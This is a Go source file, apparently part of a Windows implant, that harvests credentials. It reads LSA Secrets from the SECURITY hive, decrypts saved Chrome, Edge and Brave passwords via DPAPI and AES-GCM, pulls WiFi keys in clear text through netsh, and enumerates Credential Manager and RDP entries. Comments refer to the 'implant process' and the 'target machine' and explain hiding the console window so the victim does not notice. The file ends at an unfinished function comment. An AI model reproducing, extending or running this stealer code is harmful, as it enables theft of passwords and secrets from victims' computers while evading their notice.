//go:build windows && !light

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode"
	"unicode/utf16"
	"unicode/utf8"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ─── LSA Secrets ────────────────────────────────────────────────────────────────

// dumpLSASecrets 读取 LSA Secrets 注册表键
// 需要 SYSTEM 权限或 SeRestorePrivilege
func dumpLSASecrets() ([]map[string]string, error) {
	var results []map[string]string

	// 访问 HKLM\SECURITY\Policy\Secrets
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("无法打开 LSA Secrets 注册表键 (可能需要SYSTEM权限): %v", err)
	}
	defer key.Close()

	// 读取 NL$KM (LSA 密钥)
	nlkmData := ""
	nlkmKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\NL$KM`, registry.QUERY_VALUE)
	if err == nil {
		defer nlkmKey.Close()
		val, _, err := nlkmKey.GetBinaryValue("CurrVal")
		if err == nil && len(val) > 0 {
			nlkmData = hex.EncodeToString(val)
		}
	}

	// 枚举 Secrets 下的子键
	subKeys, err := key.ReadSubKeyNames(0)
	if err != nil {
		return nil, fmt.Errorf("无法枚举 LSA Secrets 子键: %v", err)
	}

	for _, subKeyName := range subKeys {
		if subKeyName == "NL$KM" {
			continue
		}

		secretKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		entry := map[string]string{
			"type":   "lsa_secret",
			"name":   subKeyName,
			"source": "LSA Secrets",
		}

		// 读取 CurrVal (加密的 Secret 数据)
		encData, _, err := secretKey.GetBinaryValue("CurrVal")
		if err == nil && len(encData) > 0 {
			entry["encrypted_data"] = hex.EncodeToString(encData)
			// 尝试提取可读部分 (LSA secret 结构:
			//   0-3: 长度 LE
			//   4-7: 未知
			//   8-11: 长度 LE
			//   12+: 数据 (通常为明文密码/凭据) )
			if len(encData) > 12 {
				plainLen := int(encData[0]) | int(encData[1])<<8 | int(encData[2])<<16 | int(encData[3])<<24
				if plainLen > 0 && 12+plainLen <= len(encData) {
					plainData := encData[12 : 12+plainLen]
					// 过滤只保留可打印字符
					if isPrintable(plainData) {
						entry["plaintext"] = string(plainData)
					}
				}
			}
		}
		secretKey.Close()

		// 读取 OldVal
		secretKey2, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\Secrets\`+subKeyName, registry.QUERY_VALUE)
		if err == nil {
			oldData, _, err := secretKey2.GetBinaryValue("OldVal")
			if err == nil && len(oldData) > 0 {
				entry["encrypted_old_data"] = hex.EncodeToString(oldData)
			}
			secretKey2.Close()
		}

		results = append(results, entry)
	}

	if nlkmData != "" {
		results = append(results, map[string]string{
			"type": "lsa_key",
			"name": "NL$KM",
			"data": nlkmData,
		})
	}

	return results, nil
}

func isPrintable(data []byte) bool {
	for _, b := range data {
		if b < 0x20 && b != 0x09 && b != 0x0a && b != 0x0d {
			return false
		}
	}
	return true
}

// ─── Browser Passwords ─────────────────────────────────────────────────────────

// browserCryptoStats 浏览器段的计数（打进该段 stats，真机验收时据此判断"没有垃圾"）。
type browserCryptoStats struct {
	mu sync.Mutex
	m  map[string]int
}

var browserStats browserCryptoStats

func (s *browserCryptoStats) reset() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.m = make(map[string]int)
}

func (s *browserCryptoStats) inc(key string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.m == nil {
		s.m = make(map[string]int)
	}
	s.m[key]++
}

func (s *browserCryptoStats) snapshot() map[string]int {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make(map[string]int, len(s.m))
	for k, v := range s.m {
		out[k] = v
	}
	return out
}

// chromiumBrowser 一个 Chromium 系浏览器的 User Data 目录。
type chromiumBrowser struct {
	name     string
	userData string
}

// chromiumProfile 一个 profile（"Default" / "Profile 1" / "Profile 2" …）。
type chromiumProfile struct {
	name    string
	loginDB string
}

// dumpBrowserPasswords 读取所有 Chromium 系浏览器、所有 profile 的已保存登录数据。
//
// 读取路径（不再手写 SQLite 解析）：
//  1. 枚举 User Data/*/Login Data（多 profile，不只 Default）；
//  2. 把 Login Data（连同可能存在的 -wal/-journal）复制到独立临时目录 —— 不直接
//     打开正在被浏览器占用的库，避免锁冲突，也不改动用户数据；
//  3. winsqlite3.dll 只读打开副本，SELECT origin_url, username_value,
//     password_value FROM logins，由 SQLite 自己按 varint/serial type/overflow
//     正确切列；
//  4. 按 password_value 前缀分流解密（见 decryptChromiumPassword）：v10/v11 走
//     AES-256-GCM，v20 明确标注"无法解密"，无前缀走老式 DPAPI；解不出来就留空
//     并标注，绝不把密文/中间结果当密码输出；
//  5. 丢弃 origin_url 为空或不像 URL 的行、丢弃 username 与 password 都为空的行，
//     再按 (url, username, password) 去重；
//  6. 无论成功失败都删除临时副本（含 -wal/-journal）。
func dumpBrowserPasswords() ([]map[string]string, error) {
	browserStats.reset()

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		localAppData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local")
	}
	browsers := []chromiumBrowser{
		{name: "Chrome", userData: filepath.Join(localAppData, "Google", "Chrome", "User Data")},
		{name: "Edge", userData: filepath.Join(localAppData, "Microsoft", "Edge", "User Data")},
		{name: "Brave", userData: filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data")},
	}

	var (
		results  []map[string]string
		firstErr error
	)
	for _, b := range browsers {
		list := chromiumProfiles(b.userData)
		if len(list) == 0 {
			continue
		}
		// 主密钥必须取**该浏览器自己的** Local State：Chrome 的 encrypted_key 解不开
		// Edge 的 v10 密文（旧实现只取 Chrome 的 key 喂给所有浏览器，Edge 全解失败）。
		key := chromiumMasterKey(b.userData)
		for _, p := range list {
			browserStats.inc("profiles")
			entries, err := readChromiumProfile(b.name, p, key)
			if err != nil {
				browserStats.inc("profile_errors")
				if firstErr == nil {
					firstErr = err
				}
				continue
			}
			results = append(results, entries...)
		}
	}

	results = dedupeBrowserEntries(results)

	if len(results) == 0 {
		// 一条都没拿到：winsqlite3 缺失/库损坏这类硬错误必须往上抛（该段标 error），
		// 不能静默返回空列表让界面显示"0 条密码"。
		if firstErr != nil {
			return nil, firstErr
		}
		return []map[string]string{}, nil
	}
	return results, nil
}

// chromiumProfiles 枚举一个 User Data 目录下所有含 Login Data 的 profile 子目录。
func chromiumProfiles(userDataDir string) []chromiumProfile {
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return nil
	}
	var out []chromiumProfile
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		loginDB := filepath.Join(userDataDir, e.Name(), "Login Data")
		fi, err := os.Stat(loginDB)
		if err != nil || fi.IsDir() || fi.Size() == 0 {
			continue
		}
		out = append(out, chromiumProfile{name: e.Name(), loginDB: loginDB})
	}
	// 稳定顺序：Default 优先，其余按名字排序（真机结果便于对照）。
	sort.Slice(out, func(i, j int) bool {
		if out[i].name == "Default" {
			return true
		}
		if out[j].name == "Default" {
			return false
		}
		return out[i].name < out[j].name
	})
	return out
}

// chromiumMasterKey 从 <User Data>\Local State 取 os_crypt.encrypted_key：
// base64 → 去 "DPAPI" 前缀 → CryptUnprotectData → AES 密钥（Chrome/Edge 为 32 字节）。
// 取不到返回 nil（v10/v11 条目会标 decrypt-failed，而不是把密文当密码输出）。
func chromiumMasterKey(userDataDir string) []byte {
	data, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
	if err != nil {
		return nil
	}
	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}
	if localState.OSCrypt.EncryptedKey == "" {
		return nil
	}
	raw, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil || len(raw) <= 5 || string(raw[:5]) != "DPAPI" {
		return nil
	}
	key, err := decryptDPAPI(raw[5:])
	if err != nil {
		return nil
	}
	return key
}

// readChromiumProfile 读一个 profile：复制副本 → winsqlite3 只读查询 → 分流解密。
func readChromiumProfile(browser string, p chromiumProfile, masterKey []byte) ([]map[string]string, error) {
	dir, dbPath, err := copyLoginDataToTemp(p.loginDB)
	if err != nil {
		return nil, fmt.Errorf("%s/%s 复制 Login Data 失败: %v", browser, p.name, err)
	}
	// 临时副本（含 -wal/-journal）用完必删：真机验收要求不在磁盘上留 Login Data 副本。
	defer os.RemoveAll(dir)

	rows, err := readChromiumLoginRows(dbPath)
	if err != nil {
		return nil, fmt.Errorf("%s/%s 解析 Login Data 失败: %v", browser, p.name, err)
	}

	out := make([]map[string]string, 0, len(rows))
	for _, row := range rows {
		browserStats.inc("rows")
		url := strings.TrimSpace(row.OriginURL)
		username := strings.TrimSpace(row.Username)
		if url == "" || !strings.Contains(url, "://") {
			// 手写解析时 URL 里会混进字段名/接缝字节；不像 URL 的一律丢弃。
			browserStats.inc("skipped_bad_url")
			continue
		}

		res := decryptChromiumPassword(row.Password, masterKey)
		recordChromiumFailure(res)

		if username == "" && res.password == "" {
			browserStats.inc("skipped_empty")
			continue
		}

		entry := map[string]string{
			"type":     "browser",
			"browser":  browser,
			"profile":  p.name,
			"url":      url,
			"username": username,
			"password": res.password,
			"scheme":   res.scheme,
		}
		if res.encrypted != "" {
			entry["encrypted"] = res.encrypted
		}
		out = append(out, entry)
	}
	return out, nil
}

// copyLoginDataToTemp 把 Login Data 复制到新的临时目录，返回 (目录, 副本路径)。
// 目标机上的浏览器可能正持有该库，直接读会撞锁，所以先复制再只读打开；
// 目录由调用方在 SQLite 句柄关闭后 RemoveAll（Windows 上文件被打开时删不掉）。
func copyLoginDataToTemp(src string) (string, string, error) {
	dir, err := os.MkdirTemp("", "tsl_")
	if err != nil {
		return "", "", err
	}
	dst := filepath.Join(dir, "login_data.db")
	if err := copyFile(src, dst); err != nil {
		os.RemoveAll(dir)
		return "", "", err
	}
	// 有未合并的 WAL/journal 时一起拷，读到的视图才和浏览器一致。
	for _, suffix := range []string{"-wal", "-journal"} {
		if fi, err := os.Stat(src + suffix); err == nil && !fi.IsDir() {
			if err := copyFile(src+suffix, dst+suffix); err != nil {
				os.RemoveAll(dir)
				return "", "", err
			}
		}
	}
	return dir, dst, nil
}

// recordChromiumFailure 按失败原因累加该段统计（统计里给 undecryptable_v20 计数）。
func recordChromiumFailure(res chromiumCryptoResult) {
	switch res.reason {
	case "v20":
		browserStats.inc("undecryptable_v20")
	case "no-key":
		browserStats.inc("no_master_key")
	case "bad-utf8":
		browserStats.inc("bad_utf8")
	case "decrypt-failed":
		browserStats.inc("decrypt_failed")
	}
}

// dedupeBrowserEntries 同一 (url, username, password) 只留第一条。
func dedupeBrowserEntries(entries []map[string]string) []map[string]string {
	seen := make(map[string]struct{}, len(entries))
	out := entries[:0]
	for _, e := range entries {
		key := e["url"] + "\x00" + e["username"] + "\x00" + e["password"]
		if _, ok := seen[key]; ok {
			browserStats.inc("deduped")
			continue
		}
		seen[key] = struct{}{}
		out = append(out, e)
	}
	return out
}

// chromiumCryptoResult 单条 password_value 的解密结果。
//
//	password  解出来的明文（失败时为空 —— 绝不输出密文/中间结果）
//	scheme    v10 / v11 / v20 / dpapi（空 = 该行没有 password_value）
//	encrypted 失败时给界面看的标注（成功为空）
//	reason    内部计数用（"" = 成功）
type chromiumCryptoResult struct {
	password  string
	scheme    string
	encrypted string
	reason    string
}

// decryptChromiumPassword 按 password_value 前缀分流（前缀决定算法，绝不能混用）：
//
//	v10 / v11  AES-256-GCM：12 字节 nonce + 密文 + 16 字节 tag，密钥来自该浏览器
//	           Local State 的 os_crypt.encrypted_key（DPAPI 保护）；
//	v20        Chrome/Edge 127+ 的 App-Bound Encryption：密钥由系统服务按"应用身份"
//	           绑定，当前权限解不开 —— 必须明确标注，且一个字节都不输出；
//	无前缀     老式整块 DPAPI（CryptUnprotectData）。
//
// 任何失败分支都返回空 password + encrypted 标注；解出来的字节必须通过 UTF-8 与
// 控制字符校验，否则按"解密失败"处理（旧实现把 string(密文) 直接当密码输出，
// 真机上那些 "=Qa"、"?%#%5" 就是这么来的）。
func decryptChromiumPassword(raw []byte, masterKey []byte) chromiumCryptoResult {
	if len(raw) == 0 {
		return chromiumCryptoResult{}
	}
	switch {
	case bytes.HasPrefix(raw, []byte("v20")):
		return chromiumCryptoResult{
			scheme:    "v20",
			encrypted: "v20 (app-bound, 无法解密)",
			reason:    "v20",
		}
	case bytes.HasPrefix(raw, []byte("v10")), bytes.HasPrefix(raw, []byte("v11")):
		scheme := string(raw[:3])
		if len(masterKey) == 0 {
			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "no-key"}
		}
		plain, err := decryptChromiumGCM(raw[3:], masterKey)
		if err != nil {
			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "decrypt-failed"}
		}
		password, ok := validateChromiumPlaintext(plain)
		if !ok {
			return chromiumCryptoResult{scheme: scheme, encrypted: "decrypt-failed", reason: "bad-utf8"}
		}
		return chromiumCryptoResult{password: password, scheme: scheme}
	default:
		plain, err := decryptDPAPI(raw)
		if err != nil {
			return chromiumCryptoResult{scheme: "dpapi", encrypted: "decrypt-failed", reason: "decrypt-failed"}
		}
		password, ok := validateChromiumPlaintext(plain)
		if !ok {
			return chromiumCryptoResult{scheme: "dpapi", encrypted: "decrypt-failed", reason: "bad-utf8"}
		}
		return chromiumCryptoResult{password: password, scheme: "dpapi"}
	}
}

// decryptChromiumGCM 解 v10/v11：payload = nonce(12) || ciphertext || tag(16)。
func decryptChromiumGCM(payload, key []byte) ([]byte, error) {
	if len(payload) < 12+16 {
		return nil, fmt.Errorf("密文过短: %d 字节", len(payload))
	}
	nonce := payload[:12]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, payload[12:], nil)
}

// validateChromiumPlaintext 把解密结果转成"可以展示的密码"，或判定为垃圾。
func validateChromiumPlaintext(plain []byte) (string, bool) {
	return decodeTextBlob(plain)
}

// decodeTextBlob 把"可能是 UTF-8，也可能是 UTF-16LE"的明文字节转成字符串。
//
// 判据（口令明文里正常不会有 NUL 字节）：
//   - NUL 主要落在奇数位 = UTF-16LE 的高字节（ASCII 口令的特征）→ 按 UTF-16LE 解；
//   - 否则按 UTF-8（去掉尾部 NUL，老 Chromium 的 DPAPI 段会带 C 字符串终止符）；
//   - UTF-8 非法且完全没有 NUL（纯 CJK 的 UTF-16LE 就没有 NUL）→ 再试一次 UTF-16LE；
//   - 都不成立返回 false：调用方据此标 decrypt-failed 并留空，**绝不输出垃圾字节**。
func decodeTextBlob(b []byte) (string, bool) {
	if len(b) == 0 {
		return "", true
	}
	evenNUL, oddNUL := countNULParity(b)
	if oddNUL > evenNUL {
		return decodeUTF16LEStrict(b)
	}
	if utf8.Valid(b) {
		return printableString(bytes.TrimRight(b, "\x00"))
	}
	if evenNUL == 0 && oddNUL == 0 {
		if s, ok := decodeUTF16LEStrict(b); ok && plausibleDecodedText(s) {
			return s, true
		}
	}
	return "", false
}

// plausibleDecodedText 兜底路径（无 NUL 的 UTF-16LE）的合理性闸门：
// 拒绝 BOM / U+FFFD / 控制字符，并要求至少 3/4 的码位是可打印文字或标点。
// 目的：宁可把一条罕见口令标成 decrypt-failed，也绝不把随机字节当密码输出。
func plausibleDecodedText(s string) bool {
	if s == "" {
		return false
	}
	total, good := 0, 0
	for _, r := range s {
		total++
		switch {
		case r == '\ufeff' || r == '\ufffd':
			return false
		case r == '\t':
			good++
		case unicode.IsLetter(r) || unicode.IsDigit(r) || unicode.IsPunct(r) || unicode.IsSymbol(r):
			good++
		}
	}
	return total > 0 && good*4 >= total*3
}

// countNULParity 统计偶数位 / 奇数位上的 NUL 个数（UTF-16LE 的高字节在奇数位）。
func countNULParity(b []byte) (even, odd int) {
	for i := 0; i < len(b); i++ {
		if b[i] != 0 {
			continue
		}
		if i%2 == 0 {
			even++
		} else {
			odd++
		}
	}
	return even, odd
}

// decodeUTF16LEStrict 严格按 UTF-16LE 解码：拒绝非法代理项、内嵌 NUL 码元与不可打印字符。
func decodeUTF16LEStrict(b []byte) (string, bool) {
	// 先去掉末尾的 0x0000 终止符码元（UTF-16 的 C 字符串终止符），
	// 否则 "RdpPass!\x00\x00" 会被当成"内嵌 NUL"而整条丢弃。
	for len(b) >= 2 && b[len(b)-2] == 0 && b[len(b)-1] == 0 {
		b = b[:len(b)-2]
	}
	if len(b)%2 != 0 {
		// ASCII 末字符的高字节 0x00 单独出现不构成完整码元，去掉它。
		if b[len(b)-1] != 0 {
			return "", false
		}
		b = b[:len(b)-1]
	}
	if len(b) < 2 {
		return "", true
	}
	u := make([]uint16, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		c := uint16(b[i]) | uint16(b[i+1])<<8
		if c == 0 {
			return "", false
		}
		u = append(u, c)
	}
	return printableString([]byte(string(utf16.Decode(u))))
}

// printableString 校验 UTF-8 合法且不含控制字符（除 TAB），去掉 U+FFFD。
func printableString(b []byte) (string, bool) {
	if !utf8.Valid(b) {
		return "", false
	}
	s := string(b)
	for _, r := range s {
		if r == utf8.RuneError || (r < 0x20 && r != '\t') || r == 0x7f {
			return "", false
		}
	}
	return s, true
}

// 说明：这里原先有一个"简单解析 SQLite 登录数据文件"的手写解析器
// （parseSQLiteLoginData）和配套的 v10 解密器（decryptChromePassword），两者都已删除：
//
//   - 手写解析 = 在文件里扫 "http" 开头的可打印串，再把"URL 后面 2KB 内的下一个字符串"
//     猜成用户名/密码。SQLite 的列边界只存在于 b-tree cell 记录头的 serial type 序列里，
//     跳过它意味着拿到的字节必然跨记录/跨页：真机上 password 因此变成
//     "tablelogins_edge_extendedlogins_edge_extended"（schema 文本）、url 变成
//     ".../ui/login.phpadmin"（下一条记录的 username 接上来）。这种解析无论怎么调启发式
//     都不可能正确，所以改走系统自带 winsqlite3.dll（见 sqlite_windows.go）。
//   - 解密器只有一个"v10 前缀 + 主密钥"分支，v11/v20/无前缀全落到 DPAPI 或原样输出，
//     于是把密文/中间结果当密码显示。现在统一走 decryptChromiumPassword 的三分支。

// ─── WiFi Passwords ─────────────────────────────────────────────────────────────

// dumpSavedWiFi 读取已保存的 WiFi 密码。
//
// 两个真机问题都在这里修掉：
//   - 黑框：netsh 是控制台程序，裸 exec.Command 会在目标机桌面闪一个控制台窗口
//     （用户一眼就看到，等于自曝）；现在统一走 execHidden（HideWindow +
//     CREATE_NO_WINDOW，见 exec_hidden_windows.go）。
//   - 乱码/空条目：中文系统上 netsh 输出是 GBK 字节，直接 string(out) 得到的
//     "所有用户配置文件 / 关键内容" 永远匹配不上（还会把乱码当 SSID 输出）；现在
//     统一过 decodeConsoleText（platform_windows.go：逐行判 UTF-8，非 UTF-8 按
//     GBK→UTF-8 转）。
func dumpSavedWiFi() ([]map[string]string, error) {
	out, err := execHidden(sysBin("netsh.exe"), "wlan", "show", "profiles").CombinedOutput()
	if err != nil && len(out) == 0 {
		return nil, fmt.Errorf("执行 netsh wlan show profiles 失败: %v", err)
	}
	profiles := parseWlanProfileNames(decodeConsoleText(string(out)))

	results := make([]map[string]string, 0, len(profiles))
	seen := make(map[string]struct{}, len(profiles))
	for _, ssid := range profiles {
		ssid = strings.TrimSpace(ssid)
		if ssid == "" {
			continue
		}
		if _, dup := seen[ssid]; dup {
			continue
		}
		seen[ssid] = struct{}{}

		passOut, err := execHidden(sysBin("netsh.exe"),
			"wlan", "show", "profile", "name="+ssid, "key=clear").CombinedOutput()
		if err != nil && len(passOut) == 0 {
			continue
		}
		password := parseWlanKeyContent(decodeConsoleText(string(passOut)))
		if password == "" {
			// 开放网络/没有保存密钥：跳过，不产出空条目（旧实现会刷一堆空 password）。
			continue
		}
		results = append(results, map[string]string{
			"type":     "wifi",
			"ssid":     ssid,
			"password": password,
		})
	}
	return results, nil
}

// parseWlanProfileNames 从 `netsh wlan show profiles` 输出里取 SSID。
//
// 只认 "All User Profile" / "所有用户配置文件" 两种标签；`Profile / 配置文件 /
// 用户配置文件 / 配置文件类型 / User profile` 这些行在英文/中文输出里都会出现，
// 必须跳过 —— 否则会把 "User profile" 这类说明文字当成 SSID 去查密钥。
func parseWlanProfileNames(text string) []string {
	var out []string
	for _, line := range strings.Split(text, "\n") {
		key, val, ok := splitConsoleKV(strings.TrimSpace(line))
		if !ok {
			continue
		}
		switch key {
		case "All User Profile", "所有用户配置文件":
			if val != "" {
				out = append(out, val)
			}
		}
	}
	return out
}

// parseWlanKeyContent 从 `netsh wlan show profile ... key=clear` 输出里取密码，
// 只取 `Key Content` / `关键内容` 冒号后面的值。
func parseWlanKeyContent(text string) string {
	for _, line := range strings.Split(text, "\n") {
		key, val, ok := splitConsoleKV(strings.TrimSpace(line))
		if !ok {
			continue
		}
		switch key {
		case "Key Content", "关键内容":
			return strings.TrimSpace(val)
		}
	}
	return ""
}

// splitConsoleKV 把 "标签 : 值" 拆成 (标签, 值)；同时接受全角冒号。
func splitConsoleKV(line string) (string, string, bool) {
	line = strings.TrimSpace(line)
	idx := strings.Index(line, ":")
	if full := strings.Index(line, "："); full >= 0 && (idx < 0 || full < idx) {
		idx = full
	}
	if idx <= 0 {
		return "", "", false
	}
	key := strings.TrimSpace(line[:idx])
	if key == "" {
		return "", "", false
	}
	return key, strings.TrimSpace(line[idx+1:]), true
}

// ─── RDP Credentials ────────────────────────────────────────────────────────────

var (
	procCredEnumerateW     = resolveAPI("advapi32.dll", "CredEnumerateW")
	procCredReadW          = resolveAPI("advapi32.dll", "CredReadW")
	procCredFree           = resolveAPI("advapi32.dll", "CredFree")
	procCryptUnprotectData = resolveAPI("crypt32.dll", "CryptUnprotectData")
)

// Windows 凭据结构定义
type CREDENTIAL_W struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

const (
	CRED_TYPE_GENERIC                   = 1
	CRED_TYPE_DOMAIN_PASSWORD           = 2
	CRED_TYPE_DOMAIN_CERTIFICATE        = 3
	CRED_TYPE_DOMAIN_VISIBLE_PASSWORD   = 4
	CRED_MAX_GENERIC_TARGET_NAME_LENGTH = 32767
)

// rdpTimings RDP 段的**分阶段耗时**（打进该段 timings）。
//
// 用户反馈"rdp 获取时间 200 过长"，必须先量准再改：这里把 CredEnumerateW 本身
// （系统侧枚举整个凭据库）和逐条后处理（UTF-16 转码 / 必要的 CredReadW）分开计时，
// 再据此决定优化方向，而不是为了数字好看去砍字段。
type rdpTimings struct {
	mu sync.Mutex
	m  map[string]int64
}

var rdpTimingStats rdpTimings

func (t *rdpTimings) reset() {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.m = make(map[string]int64)
}

func (t *rdpTimings) set(k string, v int64) {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.m == nil {
		t.m = make(map[string]int64)
	}
	t.m[k] = v
}

func (t *rdpTimings) snapshot() map[string]int64 {
	t.mu.Lock()
	defer t.mu.Unlock()
	out := make(map[string]int64, len(t.m))
	for k, v := range t.m {
		out[k] = v
	}
	return out
}

// rdpWorkerLimit 逐条后处理的并发上限（CredReadW 是系统调用；4 路足够掩盖单条延迟，
// 又不会在目标机上制造明显的句柄/CPU 抖动）。
const rdpWorkerLimit = 4

// dumpRDPCredentials 使用 CredEnumerateW 读取保存的 RDP / 凭据管理器条目。
//
// 耗时结构（真机实测数字见交付报告）：
//   - CredEnumerateW 一次系统调用就是主要成本：凭据库枚举 + 每条 blob 的解封都在
//     系统侧完成，我们无法在不丢字段的前提下把它拆小；
//   - 逐条后处理（UTF-16 转码、blob 为空的 domain_password 再走一次 CredReadW）现在
//     并发执行（上限 rdpWorkerLimit=4），成本被压到毫秒级。
//
// 因此这里**保留 Filter=nil**（枚举全部类型）：把 Filter 收窄成 "TERMSRV/*" 只能
// 少看、不会省时，还会丢掉 generic / domain 类条目 —— 不为"看起来快"砍字段。
// 收窄与否的实测数据见交付报告。
func dumpRDPCredentials() ([]map[string]string, error) {
	rdpTimingStats.reset()
	started := time.Now()

	// 枚举所有凭据
	var count uint32
	var credsPtr uintptr

	enumStart := time.Now()
	ret, _, callErr := procCredEnumerateW.Call(
		0, // 不使用过滤器（见函数注释：收窄 Filter 只丢字段，不省时）
		0, // 枚举所有
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&credsPtr)),
	)
	rdpTimingStats.set("cred_enumerate_ms", time.Since(enumStart).Milliseconds())

	if ret == 0 {
		// ERROR_NOT_FOUND = 目标机上没有已保存凭据：这是"0 条"，不是错误
		// （旧实现把它当失败，界面会显示一条误导性的"RDP凭据收集失败"）。
		if callErr == windows.ERROR_NOT_FOUND {
			rdpTimingStats.set("items", 0)
			rdpTimingStats.set("total_ms", time.Since(started).Milliseconds())
			return []map[string]string{}, nil
		}
		return nil, fmt.Errorf("CredEnumerateW 失败: %v", callErr)
	}

	if credsPtr != 0 {
		defer procCredFree.Call(credsPtr)
	}

	// 遍历凭据数组。
	//
	// ⚠️ CredEnumerateW 返回的是 **PCREDENTIALW 数组**（即"指向结构体的指针"数组），
	// 不是结构体数组。旧实现把"指针槽位的地址"直接当成 CREDENTIAL_W 用
	// （credsPtr + i*sizeof(指针) 强转 *CREDENTIAL_W），读到的 TargetName/Blob 全是
	// 垃圾指针 —— 一旦目标机上有任意一条已保存凭据，访问即触发 access violation，
	// 整个植入进程崩溃（"凭据获取卡死其他任务"就是这个崩溃的直接后果）。
	// 正确做法：先取出槽位里的指针，再解引用。
	creds := make([]*CREDENTIAL_W, count)
	ptrSize := unsafe.Sizeof(uintptr(0))
	for i := uint32(0); i < count; i++ {
		slot := (*uintptr)(unsafe.Pointer(credsPtr + uintptr(i)*ptrSize))
		if slot == nil || *slot == 0 {
			continue
		}
		creds[i] = (*CREDENTIAL_W)(unsafe.Pointer(*slot))
	}

	// 逐条处理（并发上限 rdpWorkerLimit）：结果按原下标回填，输出顺序与系统一致。
	entries := make([]map[string]string, count)
	var readNS int64
	var wg sync.WaitGroup
	sem := make(chan struct{}, rdpWorkerLimit)
	itemStart := time.Now()
	for i := uint32(0); i < count; i++ {
		cred := creds[i]
		if cred == nil {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(idx uint32, c *CREDENTIAL_W) {
			defer wg.Done()
			defer func() { <-sem }()
			t0 := time.Now()
			entries[idx] = buildRDPEntry(c)
			atomic.AddInt64(&readNS, time.Since(t0).Nanoseconds())
		}(i, cred)
	}
	wg.Wait()

	rdpTimingStats.set("items", int64(count))
	rdpTimingStats.set("item_process_ms", time.Since(itemStart).Milliseconds())
	rdpTimingStats.set("cred_read_sum_ms", atomic.LoadInt64(&readNS)/int64(time.Millisecond))
	rdpTimingStats.set("total_ms", time.Since(started).Milliseconds())

	results := make([]map[string]string, 0, len(entries))
	for _, e := range entries {
		if e != nil {
			results = append(results, e)
		}
	}
	return results, nil
}

// buildRDPEntry 把一条 CREDENTIAL_W 转成结果条目（被 dumpRDPCredentials 并发调用；
// 只读 cred 指向的内存，不释放 —— 释放由 CredFree 在全部 goroutine 结束后统一做）。
func buildRDPEntry(cred *CREDENTIAL_W) map[string]string {
	targetName := windows.UTF16PtrToString(cred.TargetName)
	userName := ""
	if cred.UserName != nil {
		userName = windows.UTF16PtrToString(cred.UserName)
	}

	// CredentialBlob：domain_password 是 UTF-16LE 口令，generic 可能是任意字节。
	// 旧实现直接 string(blob)，UTF-16 的 0 字节会被塞进 JSON（"p\u0000a\u0000…"），
	// 看起来就是一串乱码。这里统一走 decodeCredentialBlob 判定。
	password := ""
	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
		password = decodeCredentialBlob(blob)
	}

	// RDP 凭据通常 TargetName 包含 "TERMSRV/" 或 "MicrosoftOffice"
	isRDP := strings.HasPrefix(targetName, "TERMSRV/") ||
		strings.Contains(targetName, "RDP") ||
		strings.Contains(targetName, "Remote") ||
		(cred.Type == CRED_TYPE_GENERIC && strings.Contains(targetName, "/"))

	credType := "unknown"
	switch cred.Type {
	case CRED_TYPE_GENERIC:
		credType = "generic"
	case CRED_TYPE_DOMAIN_PASSWORD:
		credType = "domain_password"
	case CRED_TYPE_DOMAIN_CERTIFICATE:
		credType = "domain_certificate"
	case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
		credType = "domain_visible_password"
	}

	entry := map[string]string{
		"type":        credType,
		"target_name": targetName,
		"username":    userName,
		"password":    password,
		"is_rdp":      fmt.Sprintf("%v", isRDP),
	}

	// 少数场景 CredEnumerateW 不给 blob，此时用 CredReadW 再取一次
	if credType == "domain_password" && password == "" {
		if domainCred, err := readCredentialW(targetName, CRED_TYPE_DOMAIN_PASSWORD); err == nil {
			entry["password"] = domainCred
		}
	}

	return entry
}

// decodeCredentialBlob 把凭据 blob 转成可展示文本：UTF-16LE（domain_password 常见）
// 优先，其次 UTF-8；两者都不成立返回空串（不输出二进制垃圾）。
func decodeCredentialBlob(blob []byte) string {
	s, ok := decodeTextBlob(blob)
	if !ok {
		return ""
	}
	return s
}

// readCredentialW 读取特定凭据
